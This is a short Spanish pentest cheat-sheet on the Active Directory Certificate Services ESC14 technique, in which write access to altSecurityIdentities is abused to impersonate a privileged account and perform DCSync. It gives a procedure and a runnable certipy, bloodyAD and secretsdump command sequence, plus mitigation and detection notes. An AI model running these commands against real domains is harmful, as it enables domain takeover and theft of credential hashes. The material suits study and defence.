---
topic: AD CS — ESC14 y altSecurityIdentities
tags: [windows, active-directory, adcs, esc14, dcsync]
---

# AD CS — ESC14 y altSecurityIdentities

[🌐 English](adcs-esc14.en.md) | **Español**

## Concepto

AD CS emite certificados para autenticación. ESC14 abusa de `altSecurityIdentities`: si un atacante puede escribir ese atributo en una cuenta privilegiada, puede mapear un certificado que controla a esa cuenta. Al autenticarse con el certificado, el KDC lo trata como el usuario privilegiado y permite DCSync.

## Cuándo aplica

- AD CS está desplegado y se puede solicitar un certificado.
- Se tienen permisos de escritura sobre `altSecurityIdentities` de una cuenta privilegiada.
- Laplantilla permite autenticación de cliente.

## Procedimiento

1. Enumerar AD CS y plantillas con `certipy find`.
2. Identificar una cuenta con permisos de escritura sobre el atributo.
3. Solicitar un certificado y escribir el `altSecurityIdentities` correspondiente.
4. Autenticarse con el certificado y ejecutar DCSync.

## Comandos

```bash
certipy find -u <USER>@<DOMAIN> -p "<PASS>" -dc-ip <DC> -vulnerable
certipy req -u <USER>@<DOMAIN> -p "<PASS>" -ca <CA> -template <TEMPLATE>
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p "<PASS>" set object <TARGET> altSecurityIdentities -v "<CERTMAP>"
certipy auth -pfx <CERT>.pfx -dc-ip <DC>
secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC>
```

## Variantes

- ESC14 A: escribir el atributo en la cuenta víctima.
- ESC14 B: emitir el certificado con un SAN controlado.
- Combinar con ESC1 si la plantilla lo permite.

## Limitaciones

- El atributo debe estar dentro de los formatos aceptados por el KDC.
- Se necesita una plantilla de autenticación.
- Los cambios pueden auditarse y revertirse.

## Mitigación

- Restringir la escritura de `altSecurityIdentities`.
- Auditar plantillas y CA; aplicar el hardening de AD CS.
- Monitorizar certificados emitidos y autenticaciones PKINIT.

## Detección

- Cambios en `altSecurityIdentities`.
- Certificados emitidos para cuentas privilegiadas.
- Autenticaciones Kerberos con certificados inusuales.

## Referencias

- [SpecterOps — ESC14](https://posts.specterops.io/adcs-esc14-abuse-14d1a58b8b5a)
- [0xdf — Scepter](https://0xdf.gitlab.io/2025/07/19/htb-scepter.html)
- [Microsoft — altSecurityIdentities](https://learn.microsoft.com/en-us/windows/win32/adschema/a-altsecurityidentities)
